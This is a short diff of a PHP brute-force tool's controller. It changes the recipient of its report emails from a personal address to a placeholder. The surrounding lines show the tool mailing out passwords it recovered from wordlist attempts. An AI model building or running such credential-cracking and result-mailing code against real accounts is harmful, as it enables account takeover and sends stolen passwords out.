@@ -230,7 +230,7 @@ class BruteForceController extends Command{
                             $msg.= "Password =".$valueWordList."<br>";
                             if($optionMail){
                                 $mailer = new Mailer();
-                                $mailer->sendMessage('lenonleite@gmail.com',$msg);
+                                $mailer->sendMessage('you@example.com',$msg);
                             }
 
                             break;
@@ -563,7 +563,7 @@ class BruteForceController extends Command{
         //Send Mail with parcial results
         $mailer = new Mailer();
         if(empty($resultFinal)){
-            $mailer->sendMessage('lenonleite@gmail.com',"Fail, not finder password in list. =\\");
+            $mailer->sendMessage('you@example.com',"Fail, not finder password in list. =\\");
         }else{
             $msg = "PHP Avenger Informer final, list of SUCCESS:<br><br>";
             foreach($resultFinal as $result){
@@ -577,7 +577,7 @@ class BruteForceController extends Command{
                     $msg.= "Obeservation =".$result['obs']."<br>";
                 }
             }
-            $mailer->sendMessage('lenonleite@gmail.com',$msg);
+            $mailer->sendMessage('you@example.com',$msg);
         }
     }
 
